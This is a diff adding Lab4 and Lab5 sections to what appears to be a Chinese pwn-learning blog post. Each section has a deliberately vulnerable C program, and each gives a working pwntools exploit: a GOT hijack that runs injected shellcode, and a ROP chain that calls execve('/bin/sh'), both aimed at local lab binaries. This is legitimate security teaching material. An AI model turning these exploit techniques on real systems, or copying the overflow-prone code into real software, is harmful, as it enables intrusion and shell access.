@@ -220,11 +220,143 @@ r.interactive()
 
 ### # Lab4
 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char name[64];
+
+int main()
+{
+  int unsigned long long addr;
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  printf("What's you name?\n");
+  read(0, name, 0x40);
+  printf("Where do you want to write?\n");
+  scanf("%llu", &addr);
+  printf("Data: ");
+  read(0, (char *)addr, 8);
+  puts("Done!");
+  printf("Thank you %s!\n", name);
+  return 0;
+}
+```
+
+![image-20220103212102156](/assets/img/2022/image-20220103212102156.png)
+
+> 知识点：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#got-hijacking
+>
+> 思路：开了栈保护，没法直接覆盖main的返回地址。可以通过line13 首先向name中写入shellcode（因为没有开NX），然后14行至17行，获取puts的GOT表地址，并且改写puts@got的地址为name的地址。
+>
+> 在第18行，`puts("Done!");`，会去puts@got取地址并执行。(第12行 实际是puts，所以由于lazy binding的关系，puts@got表中已经放入了puts的实际地址，当然后来被我们改写掉了）。
+
+![image-20220103214630206](/assets/img/2022/image-20220103214630206.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./gothijack')
+
+context(arch='amd64', os='linux')
+
+r.recvuntil('name?\n')
+r.send(asm(shellcraft.sh()))
+
+puts_got_addr = 0x601018
+name_addr = 0x601080 #<name>
+
+r.recvuntil('write?\n')
+r.sendline(str(puts_got_addr))
+r.recvuntil('Data: ')
+r.send(p64(name_addr))
+
+r.interactive()
+```
+
 
 
 ## ROP base
 
 ### # Lab5
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main()
+{
+  char buf[16];
+  puts("This is your first rop challenge ;)");
+  fflush(stdout);
+  read(0, buf, 0x90);
+  return 0;
+}
+```
+
+![image-20220103220219559](/assets/img/2022/image-20220103220219559.png)
+
+这里发现打开了栈保护，但是其实是因为静态链接的关系，把整个glic带进来了，glic里是有canary的。
+
+而我们的main程序中是没有的：
+
+![image-20220103220453043](/assets/img/2022/image-20220103220453043.png)
+
+于是思路就是第10行栈溢出，构造ROP链，覆盖返回值。
+
+>![image-20220103222106261](/assets/img/2022/image-20220103222106261.png)
+
+使用到的工具 **ROPgadget**   ---- `ROPgadget --binary ./rop --only "pop|ret"`
+
+![image-20220103221504517](/assets/img/2022/image-20220103221504517.png)
+
+![image-20220103223533042](/assets/img/2022/image-20220103223533042.png)
+
+其他的gadgets类似。
+
+![image-20220103224728240](/assets/img/2022/image-20220103224728240.png)
+
+Exp: 
+
+```python
+from pwn import *
+
+
+r = process('./rop')
+
+r.recvuntil('challenge ;)')
+
+bss_addr = 0x6bb2e0
+pop_rsi = 0x0000000000410093 # pop rsi ; ret
+mov_rdi_rsi = 0x0000000000446c1b # mov qword ptr [rdi], rsi ; ret
+pop_rdi = 0x0000000000400686 # pop rdi ; ret
+pop_rdx = 0x00000000004494b5 # pop rdx ; ret
+pop_rax = 0x0000000000415294 # pop rax ; ret
+syscall = 0x00000000004011fc # syscall
+
+p = 'a'*0x18
+p += p64(pop_rdi)
+p += p64(bss_addr)
+p += p64(pop_rsi)
+p += '/bin/sh\x00'
+p += p64(mov_rdi_rsi)
+p += p64(pop_rsi)
+p += p64(0)
+p += p64(pop_rdx)
+p += p64(0)
+p += p64(pop_rax)
+p += p64(0x3b)
+p += p64(syscall)
+
+
+r.send(p)
+r.interactive()
+```
 
 
 
